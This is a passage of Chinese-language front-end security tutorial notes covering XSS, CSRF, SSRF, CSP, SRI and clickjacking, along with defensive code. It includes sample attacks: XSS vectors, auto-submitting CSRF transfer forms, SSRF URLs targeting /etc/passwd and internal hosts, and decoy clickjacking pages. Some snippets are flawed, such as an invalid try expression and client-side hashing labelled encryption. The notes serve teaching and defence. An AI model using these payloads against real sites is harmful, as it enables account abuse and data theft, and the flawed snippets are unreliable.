'<svg/onload=alert(1)>',\n    'javascript:alert(1)'\n];\n\n// 测试函数\nfunction testXSS(input) {\n    const div = document.createElement('div');\n    div.innerHTML = input;\n    return div.innerHTML !== input;\n}\n\n// 运行测试\ntestVectors.forEach(vector => {\n    console.log(`Testing: ${vector}`);\n    console.log(`Sanitized: ${testXSS(vector)}`);\n});\n```\n\n","IsR1vC4e":"\n# CSRF：跨站请求伪造\n\n`#前端安全`  `#R1` \n\n> 关键点：引导到黑客的网站\n\n![图片&文件](./files/20241023-2.png)\n\n\n## 目录\n<!-- toc -->\n ## 1. CSRF 的基本概念 \n\nCSRF 是一种网络攻击方式\n- 攻击者**诱导已登录用户在不知情的情况下，向服务器发送非预期的请求**。\n- 攻击者**利用用户已登录的身份**，以用户的名义执行某些操作。\n\n## 2. CSRF 攻击原理\n\n假设一个典型的攻击场景：\n\n```bash\n1. 用户登录了银行网站 A，获得了 Cookie\n2. 用户访问恶意网站 B (诱惑用户访问 B)\n3. B 网站包含一个自动提交的表单，指向 A 网站的转账接口（比如可以跨域的标签 a）\n4. 表单自动提交，携带用户在 A 网站的 Cookie\n5. A 网站收到请求，验证 Cookie 有效，执行转账\n```\n\n## 3. CSRF 攻击示例\n\n### 3.1. GET 类型攻击\n\n- 在 B 网站发起\n- 或者注入到 A 网站的评论等\n\n```html\n<!-- 恶意网站中的图片 -->\n<img src=\"http://bank.example/transfer?to=hacker&amount=1000\">\n```\n\n### 3.2. POST 类型攻击：自动提交表单\n\n```html\n<!-- 自动提交的表单 -->\n<form action=\"http://bank.example/transfer\" method=\"POST\" id=\"hack-form\">\n    <input type=\"hidden\" name=\"to\" value=\"hacker\"/>\n    <input type=\"hidden\" name=\"amount\" value=\"1000\"/>\n</form>\n<script>\n    document.getElementById('hack-form').submit();\n</script>\n```\n\n## 4. CSRF 防御措施\n\n### 4.1. CSRF Token\n\n```javascript hl:7\n// 服务端生成 Token\nconst csrfToken = generateRandomToken();\nsession.csrfToken = csrfToken;\n\n// 客户端表单\n<form action=\"/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"_csrf\" value=\"<%=csrfToken%>\">\n    <!-- 其他表单字段 -->\n</form>\n\n// 服务端验证\nif (request.body._csrf !== session.csrfToken) {\n    throw new Error('CSRF token validation failed');\n}\n```\n\n### 4.2. Double Submit Cookie\n\n```javascript\n// 客户端设置\ndocument.cookie = \"csrfToken=randomToken\";\n\n// AJAX 请求头\nfetch('/api/transfer', {\n    method: 'POST',\n    headers: {\n        'X-CSRF-Token': getCookie('csrfToken')\n    },\n    body: JSON.stringify(data)\n});\n```\n\n### 4.3. SameSite Cookie 属性\n\n```\nSet-Cookie: sessionId=abc123; SameSite=Strict\nSet-Cookie: sessionId=abc123; SameSite=Lax\n```\n\n### 4.4. 验证 Origin/Referer\n\n```javascript\n// 服务端验证示例\napp.use((req, res, next) => {\n    const origin = req.get('Origin');\n    const referer = req.get('Referer');\n    \n    if (!isValidOrigin(origin) || !isValidReferer(referer)) {\n        return res.status(403).json({ error: 'Invalid origin' });\n    }\n    next();\n});\n```\n\n## 5. 各框架的 CSRF 防护实现\n\n### 5.1. Express.js (使用 csurf 中间件)\n\n```javascript\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.use(csrfProtection);\n\napp.get('/form', (req, res) => {\n    res.render('form', { csrfToken: req.csrfToken() });\n});\n```\n\n## 6. 最佳实践建议\n\n### 6.1. **分层防御**\n\n   - 同时使用多种防御措施\n   - 合理配置 Cookie 属性\n   - 实施严格的访问控制\n\n### 6.2. **安全配置**\n\n```javascript\n// Cookie 配置\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSP 配置\nContent-Security-Policy: default-src 'self'\n```\n\n### 6.3. **关键操作验证**：添加二次验证\n\n```javascript\n// 重要操作增加二次验证\nasync function performCriticalOperation() {\n    // 验证 CSRF Token\n    if (!validateCsrfToken()) return false;\n    \n    // 要求用户输入密码或验证码\n    const verification = await requestUserVerification();\n    if (!verification.success) return false;\n    \n    // 执行操作\n    return performOperation();\n}\n```\n\n## 7. CSRF 防护检查清单\n\n- **基础防护**\n\t- [ ] 使用 CSRF Token\n\t- [ ] 设置 SameSite Cookie\n\t- [ ] 验证 Origin/Referer\n- **Cookie 安全**\n\t- [ ] 设置 HttpOnly\n\t- [ ] 设置 Secure\n\t- [ ] 合理设置过期时间\n- **请求验证**\n\t- [ ] 验证 Content-Type\n\t- [ ] 检查请求方法\n\t- [ ] 验证 Token 有效性\n- **额外安全措施**\n\t- [ ] 重要操作二次验证\n\t- [ ] 监控异常请求\n\t- [ ] 日志记录\n\n## 8. 常见问题和解决方案\n\n1. **Token 刷新问题**\n```javascript\n// 在 AJAX 请求中刷新 Token\nfunction refreshCsrfToken(response) {\n    const newToken = response.headers.get('X-CSRF-Token');\n    if (newToken) {\n        updateStoredToken(newToken);\n    }\n}\n```\n\n2. **多标签页同步**\n```javascript\n// 使用 localStorage 在标签页间同步 Token\nwindow.addEventListener('storage', (e) => {\n    if (e.key === 'csrfToken') {\n        updateCsrfToken(e.newValue);\n    }\n});\n```\n\n3. **API 调用问题**\n```javascript\n// 统一处理 API 请求\nconst api = {\n    request(url, options = {}) {\n        return fetch(url, {\n            ...options,\n            headers: {\n                ...options.headers,\n                'X-CSRF-Token': getCsrfToken()\n            }\n        });\n    }\n};\n```\n\n## 9. 其他笔记\n\n### 9.1. 一个示例\n\n![图片&文件](./files/20241023-3.png)\n\n### 9.2. 特点\n\n![图片&文件](./files/20241023-4.png)\n\n### 9.3. 如何规避\n\n- 严格的同源策略，两种策略 **strict 和 Lax** \n\t- 示例：`Set-Cookie: session=abc123; SameSite=Strict; Secure`\n\t- ![图片&文件](./files/20241023-6.png)\n- **较短的会话时间**可以减少 CSRF 攻击的窗口期\n- 双重 cookie\n\t- ![图片&文件](./files/20241023-5.png)\n- **重要操作进行二次验证**，比如重新输入密码\n- 使用 `CSRF Token`\n\t- 服务器为每个用户会话生成一个唯一的令牌，并在每个表单中包含这个令牌\n\t- ![图片&文件](./files/20241023-7.png)\n- 重要操作，需要验证码提示\n- 对于 AJAX 请求，可以**添加自定义头**\n\t- 相等于重要入口**必须通过特定的自己的 js 发起Ajax**，直接访问不行\n- **避免 get 请求**，\n\t- 至少避免直接通过 a 跨域访问了\n- CSP \n\t- 限制可以加载资源的来源\n- 风险安全提示：\n\t- 当前用户打开其他用户填写的链接时，需告知风险（**知乎跳转外链**，等等都会告知风险）\n\n### 9.4. 与 XSS 的区别\n\n![图片&文件](./files/20241023-8.png)\n\n>  因为注入是需要成本和一些条件的","stgD4ck6":"\n# SSRF（服务器端请求伪造）攻击\n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\nSSRF（Server-Side Request Forgery）是一种安全漏洞，\n\n- 攻击者能够从易受攻击的服务器发送精心构造的请求到**其他内部资源或外部系统**。\n- 这种攻击**利用了服务器对某些资源的访问权限**，可能导致敏感信息泄露、内部系统被访问，甚至是远程代码执行。\n\n## 2. SSRF 的工作原理\n\nSSRF 攻击通常遵循以下步骤：\n\na) 攻击者发现一个可以被操纵的服务器端请求。\nb) 攻击者修改这个请求，使其指向内部资源或外部系统。\nc) 服务器执行这个被修改的请求。\nd) 攻击者可能获得对内部资源的访问或信息。\n\n## 3. SSRF 的常见场景\n\n- 图片/文件上传功能\n- 网站性能检查工具\n- PDF 生成器\n- 网站代理功能\n- 外部 API 调用\n\n## 4. SSRF 的危害\n\n- 访问内部网络资源\n- 端口扫描和服务枚举\n- 读取本地文件\n- 执行远程代码（在某些情况下）\n- 绕过防火墙限制\n\n## 5. SSRF 攻击示例\n\n假设有一个网站允许用户通过 URL 提交图片：\n\n```\nhttps://example.com/fetch?url=https://user-image.com/pic.jpg\n```\n\n攻击者可能会尝试修改 URL 参数：\n\n```\nhttps://example.com/fetch?url=file:///etc/passwd\n```\n\n或\n\n```\nhttps://example.com/fetch?url=http://internal-server.local/sensitive-data\n```\n\n如果服务器没有proper地验证和限制这个 URL 参数，它可能会尝试访问本地文件系统或内部网络资源。\n\n## 6. 防范 SSRF 的方法\n\n### 6.1. 输入验证和过滤\n\n- 实施严格的 URL 验证\n- 使用白名单而不是黑名单\n\n```python\n# Python 示例\nimport re\n\ndef is_valid_url(url):\n    allowed_domains = ['example.com', 'trusted-domain.com']\n    pattern = re.compile(r'^https?://(?:' + '|'.join(map(re.escape, allowed_domains)) + ')/')\n    return bool(pattern.match(url))\n\nuser_url = request.args.get('url')\nif not is_valid_url(user_url):\n    abort(400, \"Invalid URL\")\n```\n\n### 6.2. 使用安全的库和最新的依赖\n\n- 确保使用的库能够正确处理 URL 和网络请求\n\n### 6.3. 限制网络访问\n\n- 使用防火墙规则限制服务器的出站连接\n- 实施网络分段\n\n### 6.4. **禁用不必要的协议**\n\n- **只允许 HTTP/HTTPS，禁用 file://, gopher://, etc.**\n\n### 6.5. 使用 DNS 解析白名单\n\n```python\n# Python 示例\nimport socket\n\ndef is_allowed_host(hostname):\n    allowed_ips = ['192.168.1.1', '10.0.0.1']\n    try:\n        ip = socket.gethostbyname(hostname)\n        return ip in allowed_ips\n    except socket.gaierror:\n        return False\n\nuser_url = request.args.get('url')\nparsed_url = urlparse(user_url)\nif not is_allowed_host(parsed_url.hostname):\n    abort(400, \"Host not allowed\")\n```\n\n### 6.6. 实施请求超时\n\n- **设置较短的超时时间**可以减少某些 SSRF 攻击的影响\n\n### 6.7. 使用 SSRF 特定的 WAF 规则\n\n- 配置 Web 应用防火墙来检测和阻止 SSRF 尝试\n\n### 6.8. 监控和日志记录\n\n- 实施全面的日志记录和监控，以便及时发现可疑活动\n\n### 6.9. 最小权限原则\n\n- 确保服务运行在最小必要权限下\n\n### 6.10. 使用安全的 API 网关\n\n- 对于需要访问外部资源的情况，考虑使用专门的 API 网关来处理这些请求\n\n## 7. 总结\n\n- SSRF 是一种复杂的攻击，可能导致严重的安全问题。\n- 防范 SSRF 需要多层次的安全措施，包括严格的输入验证、网络限制和持续的安全监控。\n- **随着云服务和微服务架构的普及，SSRF 的风险可能会增加**，\n\t- 因此了解和防范 SSRF 对于现代 web 应用程序的安全至关重要。","UrNw7HOp":"\n# 内容安全策略（Content Security Policy，简称 CSP）\n\n`#前端安全` \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\nCSP 是一种额外的安全层，用于**检测和缓解某些类型的攻击**，包括跨站脚本（XSS）和数据注入攻击。\n\n> - CSP 对 CSRF 的防护能力有限\n\n## 2. CSP 的工作原理\n\nCSP 通过声明一系列内容限制来告诉**浏览器从哪些源加载内容是安全的**。这些限制通常通过 **HTTP 头部或 meta 标签**来实现。\n\n## 3. CSP 的主要目标\n\n- 缓解 XSS 攻击\n- 防止未经授权的数据注入\n- 控制资源加载\n- 报告违规行为\n\n## 4. CSP 指令\n\nCSP 使用多种指令来控制不同类型的资源。以下是一些常见的指令：\n\n- `default-src`: \n\t- 为其他 CSP 指令提供一个默认值\n- `script-src`:\n\t- 控制 JavaScript 源\n- `style-src`: \n\t- 控制 CSS 源\n- `img-src`: \n\t- 控制图片源\n- `connect-src`: \n\t- 控制可以通过脚本接口加载的 URL\n- `font-src`: \n\t- 控制字体文件源\n- `object-src`: \n\t- 控制插件源（如 Flash）\n- `media-src`:\n\t- 控制音频和视频源\n- `frame-src`:\n\t- 控制框架源\n\n## 5. CSP 实现示例\n\n### 5.1. 通过 HTTP 头部\n\n>  使用 `;` 分隔开了\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; img-src 'self' https://img.example.com; style-src 'self' 'unsafe-inline';\n```\n\n### 5.2. 通过 HTML meta 标签\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self' https://trusted.cdn.com; img-src 'self' https://img.example.com; style-src 'self' 'unsafe-inline';\">\n```\n\n## 6. CSP 的特殊关键字\n\n- `'self'`: \n\t- 允许来自同一源的内容\n- `'unsafe-inline'`: \n\t- **允许内联脚本和样式**\n- `'unsafe-eval'`: \n\t- 允许使用 `eval()` 等动态代码执行方法\n- `'none'`: \n\t- 不允许任何内容\n\n## 7. CSP 报告\n\nCSP 可以配置为**仅报告违规**，而不实际阻止内容：\n\n```http\nContent-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation-report-endpoint/\n```\n\n## 8. CSP 的优势\n\n- 减少 XSS 攻击面\n- 控制资源加载，提高安全性\n- 提供违规报告机制\n- 强制执行最佳安全实践\n\n## 9. CSP 的挑战\n\n- 可能需要大量的**初始配置**\n- 可能影响**某些遗留代码或第三方脚本**\n- 需要持续维护和更新\n\n## 10. CSP 与其他安全措施的结合\n\n- 结合 HTTPS 使用以确保策略的完整性\n- 与 `X-XSS-Protection 头部`一起使用\n- 配合 `Subresource Integrity (SRI)` 使用，进一步验证外部资源\n\n> 后文有介绍\n\n## 11. CSP 3 的新特性\n\n- 严格动态代码执行：`'strict-dynamic'`\n- 外部脚本散列：\n\t- 允许特定的外部脚本\n- Worker 支持：\n\t- 控制 Web Worker 的行为\n\n示例代码（使用 Express.js 设置 CSP）：\n\n```javascript hl:2\nconst express = require('express');\nconst helmet = require('helmet');\n\nconst app = express();\n\napp.use(helmet.contentSecurityPolicy({\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'https://trusted.cdn.com'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"https://img.example.com\"],\n      connectSrc: [\"'self'\"],\n      fontSrc: [\"'self'\"],\n      objectSrc: [\"'none'\"],\n      mediaSrc: [\"'self'\"],\n      frameSrc: [\"'none'\"],\n    }\n}));\n\n// 其他应用程序代码...\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n```\n\n\n\n","XjR5pDoo":"\n# X-XSS-Protection 头部、 Subresource Integrity (SRI)\n\n\n`#前端安全`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n`X-XSS-Protection 头部`和 `Subresource Integrity (SRI)` 都是增强 Web 应用程序安全性的重要工具\n- X-XSS-Protection 主要针对**旧版浏览器**，提供了一个**额外的 XSS 防护层**\n- 而 `SRI` 则是一种更现代的安全特性，它通过验证资源的完整性来**防止资源被篡改**\n\n## 2. X-XSS-Protection 头部\n\n- X-XSS-Protection 是一个 **HTTP 响应头**，用于启用浏览器内置的跨站脚本（XSS）过滤器。\n- 这个头部主要针对旧版本的浏览器，因为现代浏览器已经内置了更先进的 XSS 防护机制。\n\n### 2.1. 语法\n\n```http\nX-XSS-Protection: <value>\n```\n\n### 2.2. 可能的值\n\n- 0: 禁用 XSS 过滤器\n- 1: 启用 XSS 过滤器（通常是浏览器默认值）\n- 1; mode=block: 启用 XSS 过滤器，并在检测到 XSS 攻击时，阻止页面加载\n- 1; `report=<reporting-URI>:` 启用 XSS 过滤器，并在检测到 XSS 攻击时报告违规行为\n\n### 2.3. 示例\n\n```http\nX-XSS-Protection: 1; mode=block\n```\n\n### 2.4. 实现（使用 Express.js）\n\n```javascript hl:10\nconst express = require('express');\nconst helmet = require('helmet');\n\nconst app = express();\n\napp.use(helmet.xssFilter());\n\n// 或者手动设置\napp.use((req, res, next) => {\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n  next();\n});\n\n// 其他应用程序代码...\n```\n\n### 2.5. 注意事项\n\n- 这个头部主要针对旧版浏览器，现代浏览器可能会忽略它\n- 不应该单独依赖这个头部来防御 XSS 攻击\n- 应该与其他安全措施（如 CSP）结合使用\n\n## 3. Subresource Integrity (SRI)\n\nSRI 是一种安全特性，允许**浏览器检查获取的资源（如 JavaScript 或 CSS 文件）是否被篡改**。它通过提供一个**加密哈希**来工作，浏览器可以用这个哈希来验证下载的资源。\n\n### 3.1. 工作原理\n\n- 为资源生成一个加密哈希\n- 在 HTML 中引用资源时包含这个哈希\n\t- 这个属性 ==integrity==\n- 浏览器下载资源并验证其完整性\n\n### 3.2. 语法\n\n```html hl:2\n<script src=\"https://example.com/example-framework.js\" \n        integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n        crossorigin=\"anonymous\"></script>\n```\n\n### 3.3. 生成 SRI 哈希\n\n可以使用在线工具或命令行工具生成 SRI 哈希。例如，使用 OpenSSL：\n\n```bash\ncat FILENAME.js | openssl dgst -sha384 -binary | openssl base64 -A\n```\n\n### 3.4. 实现示例\n\n```html hl:7,13\n<!DOCTYPE html>\n<html>\n<head>\n    <title>SRI Example</title>\n    <link rel=\"stylesheet\" \n          href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" \n          integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" \n          crossorigin=\"anonymous\">\n</head>\n<body>\n    <!-- 页面内容 -->\n    <script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" \n            integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" \n            crossorigin=\"anonymous\"></script>\n</body>\n</html>\n```\n\n### 3.5. SRI 的优势\n\n- 防止由于 CDN 遭到入侵或中间人攻击导致的资源篡改\n- 增加对第三方资源的信任\n- 与 CSP 结合使用可以提供更强的安全保障\n\n### 3.6. 注意事项\n\n- **只适用**于通过 `HTTPS` 提供的资源\n- 如果资源经常更新，可能需要频繁更新完整性哈希\n- 不是所有浏览器都支持 SRI\n\n### 3.7. 服务器端实现（使用 Express.js）\n\n```javascript\nconst express = require('express');\nconst crypto = require('crypto');\n\nconst app = express();\n\napp.use((req, res, next) => {\n  res.locals.generateSRI = (content) => {\n    const hash = crypto.createHash('sha384');\n    hash.update(content);\n    return `sha384-${hash.digest('base64')}`;\n  };\n  next();\n});\n\napp.get('/', (req, res) => {\n  const scriptContent = 'console.log(\"Hello, SRI!\");';\n  const integrity = res.locals.generateSRI(scriptContent);\n  \n  res.send(`\n    <!DOCTYPE html>\n    <html>\n    <head>\n      <title>SRI Example</title>\n    </head>\n    <body>\n      <script integrity=\"${integrity}\">${scriptContent}</script>\n    </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n```\n\n","lPhnJQ2M":"\n# 前端安全相关\n\n`#前端安全`  `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. XSS（跨站脚本攻击） \n\n### 1.1. 攻击类型\n\n- **存储型XSS**：恶意代码被存储在数据库中\n- **反射型XSS**：恶意代码通过URL参数传递\n- **DOM型XSS**：通过修改页面DOM节点形成攻击\n\n### 1.2. 防范措施\n\n1. 输入过滤：对用户输入进行严格验证\n2. 输出转义：对输出内容进行 HTML 实体编码\n3. 使用 CSP（Content Security Policy）内容安全策略\n4. 避免使用`eval()`、`innerHTML`等危险函数\n5. 对 Cookie 设置 `HttpOnly` 属性\n\n## 2. CSRF（跨站请求伪造）\n\n### 2.1. 攻击类型\n\n- **GET类型CSRF**：\n\t- 利用 GET 请求进行攻击\n- **POST类型CSRF**：\n\t- 通过**自动提交表单**进行攻击\n- **链接类型CSRF**：\n\t- 诱导用户点击恶意链接\n\n### 2.2. 防范措施\n\n1. 使用 CSRF Token 验证\n2. 验证请求来源（`Referer`）\n3. 设置 `SameSite Cookie` 属性\n4. 使用 `双重Cookie`验证\n5. **在请求头中加入自定义字段**\n\n## 3. 点击劫持（Clickjacking）\n\n### 3.1. 防范措施\n\n1. 设置 `X-Frame-Options` 响应头\n2. 使用 `frame-ancestors` CSP 指令\n3. JavaScript 框架防御\n4. 实现页面重定向保护 \n\n```bash\n// 1. 设置 X-Frame-Options 响应头\n// X-Frame-Options: DENY\n// X-Frame-Options: SAMEORIGIN\n\n// 2. 使用 CSP frame-ancestors 指令\n// Content-Security-Policy: frame-ancestors 'none';\n\n```\n\n> 更多见 [7. 点击劫持 ( Clickjacking )](/post/AxP93wEX.html)\n\n## 4. SQL注入\n\n### 4.1. 攻击原理\n\n- 通过输入特殊的 SQL 语句片段\n- 破坏原有 SQL 语句结构，实现非法操作\n\n### 4.2. 防范措施\n\n1. 使用参数化查询\n2. 过滤特殊字符\n3. 限制数据库操作权限\n4. 避免直接拼接SQL语句\n\n```javascript\n// 1. 使用参数化查询\nconst query = 'SELECT * FROM users WHERE id = ?';\nconnection.query(query, [userId]);\n\n// 2. 使用 ORM 框架\nconst user = await User.findOne({\n    where: { id: userId }\n});\n\n```\n\n## 5. 敏感信息泄露\n\n```javascript\n// 1. 避免在前端存储敏感信息\n// 错误示例\nlocalStorage.setItem('token', 'sensitive_token');\n\n// 2. 使用 HTTPS\n\n// 3. 设置正确的响应头\n\n// Cache-Control: no-store\n// Strict-Transport-Security: max-age=31536000\n```\n\n## 6. 其他安全注意事项\n\n### 6.1. 开发规范\n\n- **密码安全**\n\t- 使用 HTTPS 传输\n\t- 密码加密存储\n\t- 实施密码强度要求\n- **文件上传安全**\n\t- 限制文件类型和大小\n\t- 文件名随机化\n\t- 存储路径安全配置\n- **API安全**\n\t- 实施请求频率限制\n\t- 接口权限控制\n\t- 数据加密传输\n\n### 6.2. 最佳实践\n\n1. 定期进行安全审计\n2. 及时更新依赖包\n3. 实施错误处理机制\n4. 使用安全的第三方库\n5. 保持代码简洁，避免不必要的复杂性\n\n```bash\n# 定期检查依赖包安全性 \nnpm audit \nyarn audit\n```\n\n密码安全\n\n```javascript\n// 1. 密码强度验证\nconst validatePassword = (password) => {\n    const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)[a-zA-Z\\d]{8,}$/;\n    return regex.test(password);\n}\n\n// 2. 密码传输时使用加密\nconst encryptPassword = (password) => {\n    return crypto.createHash('sha256').update(password).digest('hex');\n}\n\n```\n\n## 7. 预防措施总结\n\n1. **代码层面**\n\t- 遵循安全编码规范\n\t- 使用成熟的安全库\n\t- 实施输入验证和输出转义\n2. **配置层面**\n\t- 启用安全响应头\n\t- 配置合适的Cookie属性\n\t- 实施访问控制策略\n3. **运维层面**\n\t- 定期安全测试\n\t- 监控异常访问\n\t- 及时修复漏洞\n\n","AxP93wEX":"\n# 点击劫持 ( Clickjacking )\n\n`#前端安全`  `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. 点击劫持原理 \n\n- 点击劫持是一种**视觉欺骗攻击**\n- 攻击者通过将**目标网站嵌入到恶意网站中的透明 iframe 中**，诱导用户在不知情的情况下点击看似正常但实际是隐藏的恶意内容。\n- 点击劫持通过**视觉欺骗手段**，诱导用户在不知情的情况下点击隐藏的页面元素。\n\n### 1.1. 基本步骤：\n\n1. 攻击者创建一个诱饵页面\n2. 将目标网站通过 iframe 嵌入到诱饵页面\n3. 使用 **CSS 将 iframe 设置为透明**\n4. 在 iframe 上层放置诱人的内容\n5. 诱导用户点击，实际点击到了透明 iframe 中的按钮\n\n## 2. 攻击示例\n\n### 2.1. 基础攻击示例\n\n```html\n  <!DOCTYPE html>\n  <html>\n  <head>\n    <title>Clickjacking Demo</title>\n    <style>\n      .wrapper {\n        position: relative;\n        width: 500px;\n        height: 300px;\n      }\n      \n      .decoy-content {\n        position: absolute;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        z-index: 2;\n        background-color: white;\n      }\n      \n      .target-iframe {\n        position: absolute;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        opacity: 0.3; /* 设置透明度用于演示，实际攻击中通常设为0 */\n        z-index: 1;\n      }\n      \n      .decoy-button {\n        position: absolute;\n        top: 50%;\n        left: 50%;\n        transform: translate(-50%, -50%);\n        padding: 10px 20px;\n        background-color: `#4CAF50;`\n        color: white;\n        border: none;\n        cursor: pointer;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"wrapper\">\n      <!-- 目标网站的iframe -->\n      <iframe class=\"target-iframe\" src=\"https://target-website.com\"></iframe>\n      <!-- 诱饵内容 -->\n      <div class=\"decoy-content\">\n        <h2>赢取免费奖品！</h2>\n        <button class=\"decoy-button\">点击领取</button>\n      </div>\n    </div>\n  </body>\n  </html>\n\n````\n\n### 2.2. 更复杂的攻击示例\n\n```html\n  <!DOCTYPE html>\n  <html>\n  <head>\n    <title>Advanced Clickjacking Demo</title>\n    <style>\n      .game-container {\n        position: relative;\n        width: 800px;\n        height: 600px;\n        margin: 0 auto;\n        border: 1px solid `#ccc;`\n        overflow: hidden;\n      }\n      \n      .game-layer {\n        position: absolute;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        z-index: 2;\n      }\n      \n      .target-frame {\n        position: absolute;\n        width: 1200px;\n        height: 800px;\n        top: -100px;\n        left: -200px;\n        opacity: 0;\n        z-index: 1;\n        transform: scale(0.8);\n        pointer-events: auto;\n      }\n      \n      .game-element {\n        position: absolute;\n        cursor: pointer;\n      }\n      \n      .score-display {\n        position: fixed;\n        top: 10px;\n        right: 10px;\n        padding: 10px;\n        background: `#333;`\n        color: white;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"score-display\">得分: <span id=\"score\">0</span></div>\n    \n    <div class=\"game-container\">\n      <!-- 目标网站iframe -->\n      <iframe class=\"target-frame\" src=\"https://target-website.com\"></iframe>\n      \n      <!-- 游戏层 -->\n      <div class=\"game-layer\">\n        <div class=\"game-element\" style=\"top: 50%; left: 50%;\">\n          <img src=\"game-target.png\" alt=\"游戏目标\">\n        </div>\n      </div>\n    </div>\n    \n    <script>\n      // 游戏逻辑，实际会诱导用户点击特定位置\n      document.querySelector('.game-layer').addEventListener('click', (e) => {\n        const score = document.getElementById('score');\n        score.textContent = parseInt(score.textContent) + 10;\n      });\n    </script>\n  </body>\n  </html>\n````\n\n## 3. 防御措施\n\n### 3.1. 服务器端防御\n\n#### 3.1.1. 设置 X-Frame-Options 响应头\n\n>  `X-Frame-Options` 用于设置网站通过 iframe 的方式嵌入的条件或规则\n\n\n```javascript hl:6,9,3\n// Express.js 示例\napp.use((req, res, next) => {\n    // 禁止所有框架嵌入\n    res.setHeader('X-Frame-Options', 'DENY');\n    \n    // 或只允许同源框架嵌入\n    // res.setHeader('X-Frame-Options', 'SAMEORIGIN');\n    \n    // 或允许特定域名嵌入\n    // res.setHeader('X-Frame-Options', 'ALLOW-FROM https://trusted-site.com');\n    \n    next();\n});\n```\n\n#### 3.1.2. 使用 Content Security Policy (CSP)\n\n```javascript hl:3,6,9\n// Express.js 示例\napp.use((req, res, next) => {\n    // 禁止所有框架嵌入\n    res.setHeader('Content-Security-Policy', \"frame-ancestors 'none'\");\n    \n    // 或只允许同源框架嵌入\n    // res.setHeader('Content-Security-Policy', \"frame-ancestors 'self'\");\n    \n    // 或允许特定域名嵌入\n    // res.setHeader('Content-Security-Policy', \"frame-ancestors 'self' https://trusted-site.com\");\n    \n    next();\n});\n```\n\n### 3.2. 客户端防御\n\n#### 3.2.1. JavaScript 框架检测\n\n```javascript\n// 检测页面是否被嵌入框架\nfunction detectFraming() {\n    if (window.self !== window.top) {\n        // 页面被嵌入框架\n        window.top.location = window.self.location;\n    }\n}\n\n// 页面加载时执行检测\nwindow.onload = detectFraming;\n```\n\n#### 3.2.2. 使用 SameSite Cookie 属性\n\n```javascript\n// 设置 Cookie\ndocument.cookie = \"session=value; SameSite=Strict\";\n```\n\n### 3.3. Frame Busting 代码\n\n```javascript\n// 基础版本\nif (top != self) {\n    top.location = self.location;\n}\n\n// 更安全的版本\n(function() {\n    if (self == top) {\n        return;\n    }\n    \n    try {\n        // 尝试访问父窗口来确认是否被嵌入\n        if (parent.frames.length > 0) {\n            top.location = self.location;\n        }\n    } catch(e) {\n        // 如果访问被阻止，说明可能是跨域嵌入\n        window.document.body.innerHTML = \n            '此页面不允许在框架中显示。';\n    }\n})();\n```\n\n## 4. 最佳实践建议\n\n1. **多层防御**\n\t- 同时使用多种防御措施\n\t- 服务器端和客户端防御结合\n\t- 定期检查防御措施的有效性\n\n2. **安全配置检查清单**\n```javascript\n// 安全配置检查函数\nfunction securityCheck() {\n    const checks = {\n        xFrameOptions: !!document.getElementsByTagName('meta')\n            .namedItem('X-Frame-Options'),\n        csp: !!document.getElementsByTagName('meta')\n            .namedItem('Content-Security-Policy'),\n        frameDetection: window.self === window.top\n    };\n    \n    console.table(checks);\n    return Object.values(checks).every(v => v);\n}\n```\n\n3. **监控和日志**\n```javascript\n// 记录可疑行为\nfunction logSuspiciousActivity() {\n    if (window.self !== window.top) {\n        const suspiciousData = {\n            timestamp: new Date().toISOString(),\n            referrer: document.referrer,\n            parentLocation: try { parent.location.href } catch(e) { 'Access Denied' },\n            userAgent: navigator.userAgent\n        };\n        \n        // 发送到日志服务器\n        sendToLogServer(suspiciousData);\n    }\n}\n```\n\n4. **定期安全审计**\n\t- 检查所有入口点\n\t- 测试防御措施的有效性\n\t- 更新安全策略\n\n\n\n## 5. 示例\n\n```html\n<!-- 攻击者的页面 -->\n<style>\n  .overlay {\n    position: absolute;\n    top: 0;\n    left: 0;\n    opacity: 0;  /* 透明的目标页面 */\n    z-index: 1;\n  }\n  .decoy {\n    position: absolute;\n    top: 0;\n    left: 0;\n    z-index: 0;\n  }\n</style>\n\n<div class=\"decoy\">\n  <!-- 诱饵内容，例如\"点击领取奖励\" -->\n</div>\n<iframe class=\"overlay\" src=\"https://target-site.com\"></iframe>\n```\n\n## 6. 具体危害\n\n### 6.1. 社交媒体攻击\n\n- 强制关注特定账号\n- 点赞/转发恶意内容\n- 发布未经授权的状态更新\n```javascript\n// 示例：诱导用户点击隐藏的\"关注\"按钮\n<iframe src=\"https://social-media.com/follow-button\" \n        style=\"opacity: 0; position: absolute;\">\n</iframe>\n```\n\n### 6.2. 账户安全威胁\n\n- 